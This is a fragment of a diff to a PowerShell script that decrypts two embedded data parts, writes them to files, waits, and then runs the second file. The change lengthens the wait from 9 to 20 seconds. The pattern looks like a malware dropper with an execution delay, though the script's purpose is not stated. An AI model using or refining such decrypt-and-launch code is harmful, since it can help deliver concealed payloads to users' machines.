@@ -32,5 +32,5 @@ function Decrypt-File {
 [System.IO.File]::WriteAllBytes($outputFile1, (Decrypt-File -encryptedData $parts[0]))
 [System.IO.File]::WriteAllBytes($outputFile2, (Decrypt-File -encryptedData $parts[1]))
 
-Start-Sleep -Seconds 9
+Start-Sleep -Seconds 20
 Start-Process -FilePath $outputFile2
